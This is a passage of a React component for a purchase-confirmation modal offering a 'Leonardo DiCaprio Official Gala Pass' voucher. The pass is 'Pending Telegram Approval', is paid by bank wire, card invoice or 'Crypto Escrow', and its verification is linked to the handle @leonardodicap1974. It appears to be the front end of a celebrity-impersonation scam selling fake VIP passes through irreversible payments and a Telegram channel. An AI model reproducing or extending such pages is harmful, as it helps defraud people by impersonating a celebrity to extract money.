                  <div className="space-y-1">
                    <span className="text-emerald-300 font-bold font-mono">3. Pass Dispatch</span>
                    <p className="text-[11px] text-zinc-400">
                      Upon confirmation, your physical laser-engraved metal pass enters priority production and courier dispatch.
                    </p>
                  </div>
                </div>
              </div>
            </div>

            {/* PRINTABLE DIGITAL PASS BADGE */}
            <div className="my-6 rounded-3xl border border-amber-400/40 bg-zinc-950 p-6 shadow-2xl relative overflow-hidden text-left">
              <div className="pointer-events-none absolute inset-0 hologram-shimmer opacity-20" />

              <div className="flex items-center justify-between border-b border-white/10 pb-4 mb-4">
                <div className="flex items-center gap-3">
                  <div className="h-10 w-10 rounded-lg bg-amber-400 flex items-center justify-center font-cinzel font-bold text-black text-sm">
                    LD
                  </div>
                  <div>
                    <h4 className="font-cinzel text-sm font-bold text-white">LEONARDO DICAPRIO</h4>
                    <span className="text-[10px] text-zinc-400 uppercase tracking-wider">Official Gala Pass Voucher</span>
                  </div>
                </div>
                <div className="text-right">
                  <span className="text-[9px] font-mono text-zinc-500 block">ORDER REF</span>
                  <span className="font-mono text-xs font-bold text-amber-300">{confirmationOrderNum}</span>
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 py-2 text-xs">
                <div>
                  <span className="text-[9px] uppercase tracking-wider text-zinc-500 block">Pass Holder</span>
                  <span className="font-bold text-white text-sm">{attendeeName || 'VIP Guest Pass'}</span>
                </div>
                <div>
                  <span className="text-[9px] uppercase tracking-wider text-zinc-500 block">Status</span>
                  <span className="font-bold text-cyan-300">Pending Telegram Approval</span>
                </div>
                <div>
                  <span className="text-[9px] uppercase tracking-wider text-zinc-500 block">Payment Provision</span>
                  <span className="text-amber-300 uppercase font-mono text-[11px]">
                    {paymentPreference === 'wire' ? 'Bank Wire / Swift' : paymentPreference === 'concierge_card' ? 'Card Invoice' : 'Crypto Escrow'}
                  </span>
                </div>
              </div>

              <div className="mt-4 pt-4 border-t border-white/10 flex items-center justify-between">
                <div className="flex items-center gap-2 text-zinc-400 text-xs">
                  <QrCode className="h-8 w-8 text-white" />
                  <span className="text-[10px]">Verification QR linked to @leonardodicap1974</span>
                </div>
                <span className="text-[10px] font-mono text-cyan-300 font-semibold">
                  Valid for 2025/2026 Season
                </span>
              </div>
            </div>

            {/* Bottom Actions */}
            <div className="flex flex-wrap items-center justify-center gap-3 pt-2">
              <a
                href={SOCIAL_MEDIA_HANDLES.telegram.url}
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-2 rounded-xl bg-gradient-to-r from-[#229ED9] to-cyan-500 px-6 py-2.5 text-xs font-bold text-white hover:scale-105 transition-transform uppercase tracking-wider shadow-lg"
              >
                <Send className="h-4 w-4" />
                <span>Go to Telegram Channel</span>
              </a>

              {onViewPurchaseHistory && (
                <button
                  onClick={() => {
                    onClose();
                    onViewPurchaseHistory();
                  }}
                  className="flex items-center gap-2 rounded-xl border border-white/15 bg-white/5 px-5 py-2.5 text-xs font-semibold text-zinc-300 hover:bg-white/10 hover:text-white transition-all uppercase tracking-wider"
                >
                  <Clock className="h-4 w-4" />
                  <span>View in Profile</span>
                </button>
              )}

              <button
                onClick={() => window.print()}
                className="flex items-center gap-2 rounded-xl border border-white/15 bg-white/5 px-5 py-2.5 text-xs font-semibold text-white hover:bg-white/10"
              >
                <Printer className="h-4 w-4" />
                <span>Print Voucher</span>
              </button>

              <button
                onClick={onClose}
                className="flex items-center gap-2 rounded-xl border border-white/20 bg-white/10 px-5 py-2.5 text-xs font-bold text-white hover:bg-white/20 uppercase tracking-wider"
              >
                <span>Return to Experience</span>
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
